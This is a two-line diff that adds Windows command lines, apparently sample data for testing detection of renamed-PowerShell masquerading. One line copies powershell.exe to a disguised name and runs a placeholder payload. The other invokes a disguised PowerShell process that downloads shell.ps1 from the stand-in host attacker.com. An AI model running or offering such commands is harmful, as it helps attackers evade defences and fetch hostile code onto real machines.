@@ -1,0 +1,2 @@
+copy powershell.exe not_sqltools.exe && not_sqltools.exe -Command "Write-Host 'Malicious Payload Here'"
+smss.exe -ExecutionParam "sqltoolsps.exe -Command 'Invoke-WebRequest http://attacker.com/shell.ps1'"
